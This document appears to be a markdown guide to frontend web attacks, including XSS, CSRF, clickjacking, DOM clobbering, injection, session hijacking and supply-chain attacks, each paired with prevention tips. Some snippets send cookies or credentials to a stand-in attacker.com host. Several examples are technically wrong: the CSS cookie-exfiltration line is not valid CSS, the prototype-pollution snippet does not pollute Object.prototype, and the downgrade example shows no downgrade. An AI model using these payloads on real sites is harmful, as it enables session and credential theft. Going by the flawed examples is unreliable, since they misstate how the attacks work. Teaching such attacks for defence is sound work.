# Frontend Attack Techniques: Comprehensive Guide

## Table of Contents

1. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
2. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
3. [Clickjacking](#clickjacking)
4. [DOM-based Attacks](#dom-based-attacks)
5. [Injection Attacks](#injection-attacks)
6. [Man-in-the-Middle (MITM) Attacks](#man-in-the-middle-mitm-attacks)
7. [Session Hijacking](#session-hijacking)
8. [Code Injection](#code-injection)
9. [Third-Party Library Attacks](#third-party-library-attacks)
10. [Browser-Specific Attacks](#browser-specific-attacks)

## Cross-Site Scripting (XSS)

### Stored XSS (Persistent XSS)

**Description**: Malicious scripts are permanently stored on the target server and executed when users access the compromised content.

**Attack Vector**:

```javascript
// Attacker injects malicious script into database
const maliciousComment = "<script>alert('XSS Attack!')</script>";
// When displayed to users:
<div>{userComment}</div>; // Executes the script
```

**Prevention**: Input sanitization, Content Security Policy (CSP), Output encoding.

### Reflected XSS (Non-Persistent XSS)

**Description**: Malicious script is reflected off a web server, such as in an error message or search result.

**Attack Vector**:

```javascript
// URL: https://example.com/search?q=<script>alert('XSS')</script>
// Server response includes unsanitized input
<p>Search results for: {searchQuery}</p>
```

**Prevention**: Input validation, URL encoding, CSP headers.

### DOM-based XSS

**Description**: Attack occurs in the browser by manipulating the DOM environment.

**Attack Vector**:

```javascript
// URL: https://example.com/page#<script>alert('XSS')</script>
const hash = window.location.hash.substring(1);
document.getElementById("content").innerHTML = hash; // Executes script
```

**Prevention**: Avoid direct DOM manipulation with user input, use textContent instead of innerHTML.

## Cross-Site Request Forgery (CSRF)

### Basic CSRF Attack

**Description**: Forces a user to execute unwanted actions on a web application where they're authenticated.

**Attack Vector**:

```html
<!-- Attacker's malicious page -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" style="display:none" />
```

**Prevention**: CSRF tokens, SameSite cookies, Origin header validation.

### Login CSRF

**Description**: Forces a user to log into an attacker's account on a vulnerable site.

**Attack Vector**:

```html
<!-- Hidden form that logs user into attacker's account -->
<form action="https://vulnerable-site.com/login" method="POST" style="display:none">
  <input name="username" value="attacker_username" />
  <input name="password" value="attacker_password" />
</form>
```

**Prevention**: Require user interaction for login, use CAPTCHA.

## Clickjacking

### Basic Clickjacking

**Description**: Tricks users into clicking on something different from what they perceive.

**Attack Vector**:

```html
<!-- Attacker's page -->
<div style="position: absolute; top: 0; left: 0; opacity: 0.01;">
  <iframe src="https://victim-site.com/like-button" width="100%" height="100%"></iframe>
</div>
<button style="position: absolute; top: 50px; left: 50px;">Click me for free iPad!</button>
```

**Prevention**: X-Frame-Options header, frame-busting scripts, CSP frame-ancestors.

### Cursorjacking

**Description**: Manipulates the cursor position to trick users into clicking on hidden elements.

**Attack Vector**:

```css
/* Attacker hides cursor and creates fake cursor */
* {
  cursor: none !important;
}
.fake-cursor {
  position: absolute;
  pointer-events: none;
  /* Follows mouse but offset from real position */
}
```

**Prevention**: Detect cursor manipulation, use pointer-events properly.

## DOM-based Attacks

### DOM Clobbering

**Description**: Overwrites DOM properties to manipulate application behavior.

**Attack Vector**:

```html
<!-- Attacker controls form elements -->
<form id="loginForm">
  <input name="username" />
  <input name="password" />
</form>

<!-- Attacker injects: -->
<div id="loginForm">
  <div id="action">https://attacker.com/steal-credentials</div>
</div>
```

**Prevention**: Use Object.hasOwnProperty(), strict property access.

### Prototype Pollution

**Description**: Modifies Object.prototype to affect all objects in the application.

**Attack Vector**:

```javascript
// Attacker controls object merge
const userInput = { __proto__: { isAdmin: true } };
Object.assign({}, userInput); // Pollutes prototype
```

**Prevention**: Use Object.create(null), validate object keys, use Map instead of objects.

## Injection Attacks

### HTML Injection

**Description**: Injects malicious HTML content into the page.

**Attack Vector**:

```javascript
const userInput = "<img src=x onerror=\"alert('HTML Injection')\">";
document.getElementById("content").innerHTML = userInput;
```

**Prevention**: HTML encoding, use textContent, DOMPurify library.

### CSS Injection

**Description**: Injects malicious CSS that can leak sensitive information or manipulate UI.

**Attack Vector**:

```css
/* Attacker injects: */
background: url("https://attacker.com/log?cookie=" + document.cookie);
```

**Prevention**: Sanitize CSS input, use CSS-in-JS libraries safely.

### JavaScript Injection

**Description**: Executes arbitrary JavaScript code in the victim's browser.

**Attack Vector**:

```javascript
// Through eval()
const userCode = "alert('Injected code'); maliciousFunction();";
eval(userCode); // Executes attacker's code
```

**Prevention**: Avoid eval(), use JSON.parse() safely, implement CSP.

## Man-in-the-Middle (MITM) Attacks

### HTTP Downgrade Attack

**Description**: Forces HTTPS connections to downgrade to HTTP.

**Attack Vector**:

```javascript
// Attacker intercepts HTTPS request and responds with HTTP redirect
location.href = "http://victim-site.com"; // Steals session data
```

**Prevention**: HSTS headers, certificate pinning, always use HTTPS.

### SSL Stripping

**Description**: Intercepts HTTPS requests and serves HTTP content instead.

**Attack Vector**:

```javascript
// Attacker modifies links on HTTP pages
const links = document.querySelectorAll('a[href^="https://"]');
links.forEach((link) => {
  link.href = link.href.replace("https://", "http://");
});
```

**Prevention**: HSTS preload, secure cookie flags, HTTPS-only policies.

## Session Hijacking

### Session Fixation

**Description**: Forces a user to use a known session ID.

**Attack Vector**:

```javascript
// Attacker sets session ID via URL
const maliciousUrl = "https://victim.com/login?sessionId=attacker_session";
// User logs in with attacker's session ID
```

**Prevention**: Regenerate session IDs after login, use HttpOnly cookies.

### Session Sidejacking

**Description**: Steals session cookies through network sniffing.

**Attack Vector**:

```javascript
// Attacker captures cookies via network interception
const stolenCookies = captureNetworkTraffic();
// Reuse cookies to impersonate user
```

**Prevention**: Secure flag on cookies, HTTPS everywhere, session timeouts.

## Code Injection

### Template Injection

**Description**: Injects malicious code into template engines.

**Attack Vector**:

```javascript
// Handlebars template injection
const template = '{{#with this}}{{lookup this "maliciousFunction"}}{{/with}}';
const data = {
  maliciousFunction: () => {
    /* malicious code */
  }
};
```

**Prevention**: Sanitize template input, use safe template delimiters.

### JSONP Injection

**Description**: Exploits JSONP endpoints to inject malicious scripts.

**Attack Vector**:

```html
<!-- Vulnerable JSONP endpoint -->
<script src="https://api.example.com/data?callback=alert('injected')"></script>
```

**Prevention**: Avoid JSONP, use CORS with proper validation.

## Third-Party Library Attacks

### Malicious Package Injection

**Description**: Attacker publishes malicious packages to package repositories.

**Attack Vector**:

```javascript
// Malicious package in node_modules
const maliciousLib = require("legit-looking-package");
// Contains: process.env.SECRET_KEY leaked to attacker
```

**Prevention**: Package auditing, lock files, dependency scanning.

### Subresource Integrity Bypass

**Description**: Modifies CDN-hosted scripts to inject malicious code.

**Attack Vector**:

```html
<!-- Attacker modifies CDN script -->
<script src="https://cdn.example.com/jquery.js"></script>
<!-- Becomes malicious script -->
```

**Prevention**: Subresource Integrity (SRI) hashes, CSP, local hosting.

## Browser-Specific Attacks

### WebRTC IP Leakage

**Description**: Leaks internal IP addresses through WebRTC.

**Attack Vector**:

```javascript
// Extract internal IP via WebRTC
const pc = new RTCPeerConnection();
pc.createDataChannel("");
pc.createOffer().then((offer) => {
  // Parse offer for internal IPs
});
```

**Prevention**: Disable WebRTC when not needed, use VPN.

### Browser Extension Attacks

**Description**: Malicious browser extensions access sensitive data.

**Attack Vector**:

```javascript
// Extension with excessive permissions
chrome.tabs.executeScript({
  code: 'document.querySelector("input[type=password]").value'
});
```

**Prevention**: Review extension permissions, use incognito mode.

### Service Worker Attacks

**Description**: Compromised service workers can intercept and modify requests.

**Attack Vector**:

```javascript
// Malicious service worker
self.addEventListener("fetch", (event) => {
  event.respondWith(modifyResponse(event.request));
});
```

**Prevention**: Secure service worker registration, validate SW scripts.

## Advanced Attack Techniques

### Race Condition Attacks

**Description**: Exploits timing differences in asynchronous operations.

**Attack Vector**:

```javascript
// Multiple rapid requests exploit race condition
Promise.all([
  fetch("/api/transfer", { method: "POST", body: JSON.stringify({ amount: 1000 }) }),
  fetch("/api/transfer", { method: "POST", body: JSON.stringify({ amount: 1000 }) })
]);
```

**Prevention**: Atomic operations, request deduplication, proper locking.

### Side-Channel Attacks

**Description**: Extracts information through indirect means like timing or power consumption.

**Attack Vector**:

```javascript
// Timing attack on password comparison
function checkPassword(input) {
  for (let i = 0; i < Math.min(input.length, realPassword.length); i++) {
    if (input[i] !== realPassword[i]) return false;
    // Attacker measures timing differences
  }
}
```

**Prevention**: Constant-time comparison functions, avoid timing leaks.

## Prevention Strategies Summary

### Defense in Depth

1. **Input Validation**: Validate and sanitize all user inputs
2. **Output Encoding**: Encode data before displaying to users
3. **Content Security Policy**: Restrict resource loading and script execution
4. **HTTPS Everywhere**: Encrypt all communications
5. **Secure Headers**: Implement security headers (HSTS, X-Frame-Options, etc.)
6. **Regular Updates**: Keep dependencies and frameworks updated
7. **Security Monitoring**: Log and monitor for suspicious activities
8. **Code Reviews**: Regular security code reviews
9. **Penetration Testing**: Regular security assessments

### Tools and Libraries

- **DOMPurify**: HTML sanitization
- **Helmet.js**: Security headers for Express
- **CSP**: Content Security Policy implementation
- **OWASP ZAP**: Web application security scanner
- **Snyk**: Dependency vulnerability scanning

### Best Practices

- Never trust user input
- Use principle of least privilege
- Implement proper error handling
- Regular security training for developers
- Stay updated with latest security threats
- Use security-focused development frameworks

---

_This document provides comprehensive coverage of frontend attack techniques. Regular updates and security assessments are crucial for maintaining application security._
